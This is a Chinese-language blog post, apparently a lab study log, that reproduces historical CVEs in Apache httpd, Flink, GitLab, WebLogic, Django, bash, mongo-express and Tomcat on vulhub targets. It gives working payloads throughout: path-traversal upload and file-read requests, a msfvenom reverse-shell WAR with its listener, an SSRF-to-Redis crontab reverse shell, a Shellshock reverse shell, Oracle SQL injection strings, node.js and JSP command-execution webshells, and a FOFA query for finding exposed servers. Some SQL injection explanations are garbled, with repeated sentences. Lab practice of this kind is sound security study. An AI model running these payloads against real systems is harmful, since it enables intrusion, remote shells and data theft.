---
title: "中间件-vulhub靶场练习"
date: 2025-12-11T00:00:00+08:00
draft: false
---

# 中间件-vulhub靶场练习

因为看见这个项目涉及很多历史CVE，所以想着打一打了解一下

### Apache 

##### CVE-2017-15715 HTTPD-换行解析漏洞

* 影响版本：

  Apache 2.4.0-2.4.29

* 复现

  生成evil.php文件：

  ~~~php
  <?php phpinfo();?>
  ~~~

  访问8080端口进入文件上传界面，正常上传evil.php会被拦截并回显：bad file
  抓包修改文件名，hex格式下，在evil.php的hex编码后面加上0a，发包，发现上传成功

  访问evil.php%0a文件，出现phpinfo界面，成功

  ![image-20240330220425115](C:\Users\煜阳\AppData\Roaming\Typora\typora-user-images\image-20240330220425115.png)

##### CVE-2020-17518 Flink -文件上传漏洞

* 背景：

  引入的REST处理程序允许用户通过恶意修改的HTTP头将上传的文件写入本地文件系统上的任意位置

* 影响版本

  Apache Flink: 1.5.1 ~ 1.11.2

* 复现

  访问8081端口进入flink主页

  选择Submit New Job页面，点击Add New随便传个文件抓包

  jar包存放目录是/tmp/flink-web-UUID/flink-web-upload，所以修改文件名（filname）为tmp路径：

  ~~~http
  POST /jars/upload HTTP/1.1
  Host: 192.168.221.128:8081
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
  Accept: application/json, text/plain, */*
  Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
  Accept-Encoding: gzip, deflate
  Content-Type: multipart/form-data; boundary=---------------------------335023250531190076591776691209
  Content-Length: 261
  Origin: http://192.168.221.128:8081
  Connection: close
  Referer: http://192.168.221.128:8081/
  Cookie: kodUserLanguage=zh-CN; CSRF_TOKEN=2fphCdbbGR4Q3q8g; kodUserID=2
  
  -----------------------------335023250531190076591776691209
  Content-Disposition: form-data; name="jarfile"; filename="../../../../../../../tmp/test"
  Content-Type: application/octet-stream
  
  666
  -----------------------------335023250531190076591776691209--
  ~~~

用repeater发包，服务器会返回400 Bad Request，但实际上已经上传成功，进入容器查看：![屏幕截图 2024-03-24 173104](E:\Desktop\Screenshots\屏幕截图 2024-03-24 173104.png)

存在test文件，成功

同理，可以更改路径来覆盖已有文件

* 成因

  代码中接收filename后直接将其与系统路径拼接，进行文件上传过程，所以可以利用../进行目录穿越

##### CVE-2020-17519 Flink -任意文件读取漏洞

* 描述

  Apache Flink 1.11.0中引入的一项更改(包括版本1.11.1和1.11.2)允许攻击者通过JobManager进程的REST API接口读取JobManager本地文件系统上的任何文件

* 影响版本

  - 1.11.0
  - 1.11.1
  - 1.11.2

* 利用

  进入8081端口发现是Apache Flink Dashboard

  尝试使用payload：

  ~~~payload
  http://192.168.157.148:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
  ~~~

  发现可以查看用户账户信息，payload可用

### Gitlab

##### CVE-2016-9086 Gitlab任意文件读取漏洞

* 描述

  [GitLab](https://about.gitlab.com/) 是一个利用Ruby on Rails开发的开源应用程序，实现一个自托管的Git项目仓库，可通过Web界面进行访问公开的或者私人项目，gitlab在8.9版本后添加了“导出项目”和”导入项目“功能，却没有处理好压缩包中的软连接，导致了已登陆用户可以利用该功能读取服务器上的任意文件

* 影响版本

  * 8.13.0至8.13.2版本
  * 8.12.0至8.12.7版本
  * 8.11.0至8.11.10版本
  * 8.10.0至8.10.12版本
  * 8.9.0至8.9.11版本

* 利用

  * 先访问8082端口进入登录界面

  * 首先注册并登录用户，点`New project`创建新项目
  * 给项目命名并点击GitLab export进入导入界面
  * 这里可以上传靶场自带的压缩包，gitlab在解析该压缩包时会触发任意文件读取的payload，这里上传靶场自带的test.tar.gz可以触发读取/etc/passwd，在报错中回显出来

* 原理分析

  一个空项目被导出后有如下结构：

  * project.json
  * test.tar.gz
  * VERSION

  VERSION 的文件内容为GitLab的导出模块的版本，project.json则包含了项目的配置文件

  而导入GitLab的导出文件的时候，GitLab会按照如下步骤处理：

  * 服务器根据VERSION文件内容检测导出文件版本，如果版本符合，则导入
  * 服务器根据Project.json文件创建一个新的项目，并将对应的项目文件拷贝到服务器上对应的位置

  检测version的代码如下

  ```ruby
  ...
  def check!
      version = File.open(version_file, &:readline)
      verify_version!(version)
  rescue => e
      shared.error(e)
      false
  end
  ...
  def verify_version!(version)
      if Gem::Version.new(version) != Gem::Version.new(Gitlab::ImportExport.version)
          raise Gitlab::ImportExport::Error.new("Import version mismatch: Required #{Gitlab::ImportExport.version} but was #{version}")
      else
          true
      end
  end
  ...
  ```

  这里读取了VERSION文件的第一行赋值给变量version，在将version与当前版本比较，判断是否相同，相同返回true，不同则返回错误信息（错误信息中包括变量的值）

  于是可以利用软连接来使报错信息回显目标文件，可以尝试给VERSION文件加上软连接并重新打包

  ~~~shell
  ln -sf /etc/passwd VERSION
  
  tar zcf change_version.tar.gz ./
  ~~~

  这样，读取VERSION文件的时候服务器就会根据软链接读取到/etc/passwd的第一行内容并赋值给version，但是由于version与当前版本不相同，所以会输出version的值，也就是/etc/passwd第一行的内容

  同理，获取json文件的代码如下

  ~~~ruby
  def restore
      json = IO.read(@path)
      tree_hash = ActiveSupport::JSON.decode(json)
      project_members = tree_hash.delete('project_members')
  
      ActiveRecord::Base.no_touching do
          create_relations
      end
  rescue => e
      shared.error(e)
      false
  end
  ~~~

  这里依然可以使用软连接来使变量获取目标文件的内容，因为目标文件无法被json decode，所以报错并回显目标文件内容，而且这里的回显没有行数限制，更为方便，所以相比之下选择添加给project.json软连接并打包：

  ~~~shell
  ln -sf /etc/passwd project.json
  
  tar zcf change_version.tar.gz ./
  ~~~

  如此便可以得到和上面test.tar.gz功能一致的压缩包

### weblogic

端口默认7001

##### weakpass

* 弱口令

  这个很简单，常用弱口令爆破出：`weblogic/Oracle@123`就能进入后台了

  ~~~markdown
  weblogic 常用弱口令：
  用户名：weblogic、system、admin、WebLogic
  密码：weblogic、weblogic123、password、security、system、admin、WebLogic
  ~~~

  接下来可以进行写马

  这里我用kali制作一个war包的木马：

  ~~~shell
  msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.221.128 LPORT=4444 -f war -o java.war
  ~~~

  将马上传至网站目录

  

  msf监听：

  ~~~markdown
  启动
  msfconsole
  
  告诉 Metasploit Framework 要使用的 exploit（漏洞利用模块）是 multi/handler，这个模块通常用于监听器，用于接收由漏洞利用工具生成的反向连接
  use exploit/multi/handler
  
  设置要使用的payload为 Java Meterpreter 反向 TCP
  set payload java/meterpreter/reverse_tcp
  
  设置本地监听地址
  set LHOST 192.168.221.128
  
  设置本地监听端口
  set LPORT 4444
  
  运行
  run
  ~~~

  在网页访问木马文件触发其运行，msf即可getshell

  

* 任意文件读取

  这个不算是weblogic本身的漏洞，应该是因为docker的原因造成的，在url上访问`http://ip/hello/file.jsp?path=/文件路径`即可实现任意文件读取

  因此，可以尝试读取密钥和密码的密文，再进行AES解密即可拿到后台密码

  

##### CVE-2018-2894 任意文件上传

* 影响版本

  10.3.6.0

  12.1.3.0

  12.2.1.2

  12.2.1.3

* 启动靶场

  由于漏洞需要登陆后利用，先docker执行`docker-compose logs | grep password`命令获取账号密码进行登录并进入利用点，流程如下：

  ~~~markdown
  登录->base_domain->高级->开启web测试页->保存
  ~~~

* 利用

  管理在进行了测试后忘记关掉web测试页的情况下可以进行利用：

  访问[ip]/ws_utc/config.do进入设置

  

  通用 --》修改工作目录为**/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css**，访问该目录无需权限，提交

   

  安全 --》添加 --》选择文件，上传一个jsp大马并抓包，在响应包中获取时间戳，访问**/ws_utc/css/config/keystore/1709406336100(时间戳)_dama.jsp(文件名)**，即可读写任意文件，getshell等操作（有一说一这个大马真的功能强大，看图）![image-20240303031230921](C:\Users\煜阳\AppData\Roaming\Typora\typora-user-images\image-20240303031230921.png)
  
* 触发条件

  * 知道部署应用的web目录
  * ws_utc/config.do在开发模式下无需认证，在生产模式下需要认证

##### CVE-2014-4210 SSRF

这是一个用weblogic打redis的靶场

Weblogic SSRF 漏洞出现在 uddi 组件（所以安装Weblogic时如果没有选择 uddi 组件那么就不会有该漏洞），
更准确地说是 uudi 包实现包 uddiexplorer.war 下的 SearchPublicRegistries.jsp。
所以修复的直接方法是将 SearchPublicRegistries.jsp 直接删除就好了


访问http://[ip]:7001/uddiexplorer/，发现无需登录查看 uddiexplorer 应用，进入SearchPublicRegistries目录，使用Search by business name随便输入名称进行搜索并抓包，发现POST包中传递了如下参数：

~~~http
operator=http%3A%2F%2Fwww-3.ibm.com%2Fservices%2Fuddi%2Finquiryapi&rdoSearch=name&txtSearchname=&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
~~~

尝试修改operator的值发现可以利用ssrf进行存活ip探测和端口扫描，尝试探测docker的redis服务器`http://172.xx.xx.xx:6379/`发现redis开放

发送三条重新分发命令，将 shell 脚本写入`/etc/crontab`，利用计划任务反弹shell：

~~~shell
set 1 "\n\n\n\n* * * * * root bash -c 'sh -i >& /dev/tcp/[ip]/4444 0>&1'\n\n\n\n"
config set dir /etc/
config set dbfilename crontab
save
~~~

* `set 1`：设置第一个定时任务。
* `"\n\n\n\n* * * * * root bash -c 'sh -i >& /dev/tcp/[ip]/4444 0>&1'\n\n\n\n"`：在 crontab 中设置了一个定时任务，每分钟执行一次。任务的命令是 `bash -c 'sh -i >& /dev/tcp/[ip]/4444 0>&1'`，这个命令的作用是在目标机器上通过网络连接到 IP 地址端口为 `4444` 的服务器，并将 shell 的输入和输出重定向到网络连接上，实现反弹 shell 的功能。
* `config set dir /etc/`：设置了配置目录为 `/etc/`，即将 crontab 文件保存在 `/etc/` 目录下。
* `config set dbfilename crontab`：设置了数据库文件名为 `crontab`。

* `save`：保存设置。

将payload进行url编码,并将所有%0A替换成%0D%0A，并在payload结尾也加上%0D%0A（原因参考之前分享的CRLF）：

~~~http
test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.11.34.231%2F4444%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0A
~~~

payload放在redis的url后面发送请求：

![image-20240303180622253](C:\Users\煜阳\AppData\Roaming\Typora\typora-user-images\image-20240303180622253.png)

发包并且在kali上监听4444端口：

~~~shell
nc -lvp 4444
~~~

成功getshell

##### CVE-2020-14882、14883  权限绕过即RCE

* 影响版本：

   10.3.6.0.0

   12.1.3.0.0

   12.2.1.3.0

   12.2.1.4.0

   14.1.1.0.0

* 原理

  太菜了暂时看不懂，存一篇文章先[CVE-2020-14882：Weblogic Console 权限绕过深入解析_weblogic console绕过-CSDN博客](https://blog.csdn.net/weixin_45728976/article/details/109512848?ops_request_misc=&request_id=&biz_id=102&utm_term=cve-2020-14882&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-109512848.142^v99^control&spm=1018.2226.3001.4187)

* 利用

  进入console页面，这里需要登陆，但如果直接访问`/console/images/%252E%252E%252Fconsole.portal`，即可绕过登录直接进入后台，将这个路径url解码一下：

  ~~~shell
  /console/images/../console.portal
  ~~~

  可以看出这里利用了目录穿越

   

  接下来是脚本的利用：[GitHub - backlion/CVE-2020-14882_ALL: CVE-2020-14882_ALL综合利用工具，支持命令回显检测、批量命令回显、外置xml无回显命令执行等功能。](https://github.com/backlion/CVE-2020-14882_ALL)

  * 有回显时：

    直接在攻击机上运行脚本:
    ~~~shell
    python CVE-2020-14882_ALL.py -u http://[ip]:7001 -c "ls" #ip、端口为靶机的
    ~~~

    即可直接getshgell

* FOFA

  ~~~fofa
  app="BEA-WebLogic-Server"
  ~~~

  

### Django

##### CVE-2017-12794 debug page XSS漏洞

* 影响版本

  1.11.5之前

* 利用

  访问http://[ip]:8001/create_user/,发现数据异常报错，这里描述了通过get方法获取的username参数，用于创建用户

  get传参：

  ~~~http
  ?username=<script>alert(1)</script>
  ~~~

  创建了一个名为`<script>alert(1)</script>`的用户

  再次重复传参，重复创建用户导致报错，页面解析用户名的payload触发XSS，导致弹窗

##### CVE-2020-9402 GIS SQL注入

* 影响版本：

  1.11.29之前的1.11.x版本
  2.2.11之前的2.2.x版本
  3.0.4之前的3.0.x版本

* 漏洞**1**：

  在vuln目录下：

  ~~~url
  http://[ip]:8000/vuln/?q=20)%20%3D%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20version%20FROM%20v%24instance))%20from%20dual)%20is%20null%20%20OR%20(1%2B1
  ~~~

  将payload进行url解码看看：

  ~~~url
  http://[ip]:8000/vuln/?q=20) = 1 OR (select utl_inaddr.get_host_name((SELECT version FROM v$instance)) from dual) is null  OR (1+1
  ~~~

  可以从报错信息中获取Oracle数据库版本信息（12.1.0.2.0）

  **基于错误的漏洞利用**

  该技术涉及强制数据库执行导致错误的操作。目标是从数据库中提取数据并将其显示在错误消息中。当无法使用其他技术（如基于 UNION 的注射）时，这种方法很有用。

  **UTL_INADDR。GET_HOST_NAME功能**

  该函数是一个 Oracle 内置函数，它尝试返回传递给它的参数的主机名。在本例中，该参数是从视图中检索数据库版本的另一个查询。`UTL_INADDR.GET_HOST_NAME``v$instance`

  **SQL 注入语法**

  SQL 注入语法旨在将值与函数的结果连接起来。该函数将尝试返回传递给它的IP对应的主机名，即数据库版本。当数据库无法找到具有数据库版本的主机名时，它将返回一条错误消息。`UTL_INADDR.GET_HOST_NAME``GET_HOST_NAME`

  **错误消息操作**

  数据库生成的错误消息将包含数据库版本，这是所需的信息。通过操纵传递给函数的参数，攻击者可以在错误消息中提取并显示所需的信息。数据库生成的错误消息将包含数据库版本，这是所需的信息。通过操纵传递给`GET_HOST_NAME`函数的参数，攻击者可以在错误消息中提取并显示所需的信息。`GET_HOST_NAME`

  **工作原理**

  此技术背后的原理是使用该函数强制数据库执行将导致错误的查询。数据库生成的错误消息将包含所需的信息，在本例中为数据库版本。此技术可用于从数据库中提取其他敏感信息，例如用户名或表名。这种技术背后的原理是使用`UTL_INADDR.GET_HOST_NAME`强制数据库执行将导致错误的查询的函数。数据库生成的错误消息将包含所需的信息，在本例中为数据库版本。此技术可用于从数据库中提取其他敏感信息，例如用户名或表名。`UTL_INADDR.GET_HOST_NAME`

* 漏洞**2**：

  在vuln2目录下：

  ~~~url
  http://[ip]:8000/vuln2/?q=0.05)))%20FROM%20%22VULN_COLLECTION2%22%20%20where%20%20(select%20utl_inaddr.get_host_name((SELECT%20user%20FROM%20DUAL))%20from%20dual)%20is%20not%20null%20%20--
  ~~~

  url解码看看：

  ~~~url
  http://[ip]:8000/vuln2/?q=0.05))) FROM "VULN_COLLECTION2"  where  (select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is not null  --
  ~~~

  可以从报错信息中获取数据库用户名
  
  **组件：**
  
  1. `q=0.05`：这是原始参数值，可能在 SQL 查询中用于筛选或检索数据。
  2. `)) FROM "VULN_COLLECTION2"`：这是关闭原始 SQL 查询并注入新查询的尝试。用于关闭原始查询中的任何左括号，并尝试指定表名。`))``FROM "VULN_COLLECTION2"`
  3. `(select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is not null`：这是注入的查询。它使用该函数，该函数是一个 Oracle 函数，尝试从 IP 地址解析主机名。`UTL_INADDR.GET_HOST_NAME`
  
  **开发技术：**
  
  此有效负载的目标是通过强制数据库执行具有子查询结果的函数来提取数据库用户名。该表是 Oracle 中的一个特殊表，它始终返回带有单列的单行。`UTL_INADDR.GET_HOST_NAME``(SELECT user FROM DUAL)``DUAL`
  
  当数据库以数据库用户名作为参数执行函数时，它将尝试解析主机名，这将失败，因为数据库用户名不是有效的主机名。此失败将导致包含数据库用户名的错误消息。`UTL_INADDR.GET_HOST_NAME`
  
  通过使用该条件，攻击者试图强制数据库返回包含数据库用户名的错误消息。错误消息可能包含用户名，然后攻击者可以提取该用户名。`is not null`
  
  **基于错误的漏洞利用：**
  
  这种技术称为基于错误的利用，攻击者注入有意导致错误的查询，并且错误消息用于提取敏感信息。在这种情况下，错误消息将包含数据库用户名，该用户名可用于进一步利用系统。
  
  总体而言，此有效负载是攻击者如何使用基于错误的 SQL 注入技术从 Oracle 数据库中提取敏感信息的一个巧妙示例。

##### CVE-2014-6271 shellshock-破壳漏洞

* 漏洞范围：bash版本小于等于4.3

* 成因

  * linux web server 一般可以提供CGI接口，允许远程执行bash命令
  * 对于http头部，CGI脚本解析器会将其当作环境变量，调用Bash的env相关函数设置到临时环境变量中
  * HTTP允许发送任意客户端自定义的HTTP头部

  这样就产生了一个完整的可供Bash命令注入的场景，客户端故意发送构造好的带有攻击命令的http头部到服务端，服务端调用设置环境变量的函数，直接执行了客户端指定的头部中的命令

  要是用一句话概括这个漏洞，就是**代码和数据没有正确区分**

* 利用

  进入http://[ip]:8080/vicim.cgi页面，该页面是由bash4.3生成的

  在User-Agent中设置payload并访问页面：

  ~~~bash
  () { :; }; echo Content-Type: text/plain; echo; /usr/bin/id
  ~~~

  可以看见回显：

  ~~~http
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ~~~

  证明可以进行命令执行，考虑反弹shell，开启vps监听并执行反弹shell命令：

  ~~~bash
   () { :;}; echo;/bin/bash -i >& /dev/tcp/[ip]/3000 0>&1
  ~~~

  成功反弹shell![image-20240312195938734](C:\Users\煜阳\AppData\Roaming\Typora\typora-user-images\image-20240312195938734.png)

### Mongo

##### CVE-2019-10758 Mongo-Express远程代码执行

* 前言

   mongo-express是一款mongodb的第三方Web界面，使用node和express开发。如果攻击者可以成功登录，或者目标服务器没有修改默认的账号密码（`admin:pass`），则可以执行任意node.js代码

* 利用

  访问http://[ip]:8081可以进入Mongo Express界面

  抓包将内容修改为：

  ~~~http
  POST /checkValid HTTP/1.1
  Host: target-ip
  Accept-Encoding: gzip, deflate
  Accept: */*
  Accept-Language: en
  User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
  Connection: close
  Authorization: Basic YWRtaW46cGFzcw==
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 124
  
  document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("touch /tmp/success")
  ~~~

  这里执行node.js代码，在tmp目录下创建success文件

  放包回显valid，成功：

  ![image-20240313114655782](C:\Users\煜阳\AppData\Roaming\Typora\typora-user-images\image-20240313114655782.png)在docker中查看tmp目录发现新增success文件

  ![image-20240313114808829](C:\Users\煜阳\AppData\Roaming\Typora\typora-user-images\image-20240313114808829.png)

### Tomcat

##### CVE-2017-12615 PUT方法任意写文件漏洞

* 影响版本

  Apache Tomcat 7.0.0 - 7.0.79（7.0.81修复不完全）

* 利用

  访问http://[ip]:8080可进入tomcat管理界面

  尝试PUT方法写文件

  ~~~http
  PUT /2.jsp HTTP/1.1
  Host: 192.168.239.129:8080
  User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
  Accept-Encoding: gzip, deflate
  DNT: 1
  Connection: close
  Upgrade-Insecure-Requests: 1
  Cache-Control: max-age=0
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 57
  
  <%Runtime.getRuntime().exec(request.getParameter("i"));%>
  
  ~~~

  这样是返回404，原因是不允许写入jsp文件

  有三种方法绕过

  * 2.jsp%20
  * 2.jsp::$DATA
  * 2.jsp/

  如此发包，返还值为201（PUT文件成功），即可利用此原理写马

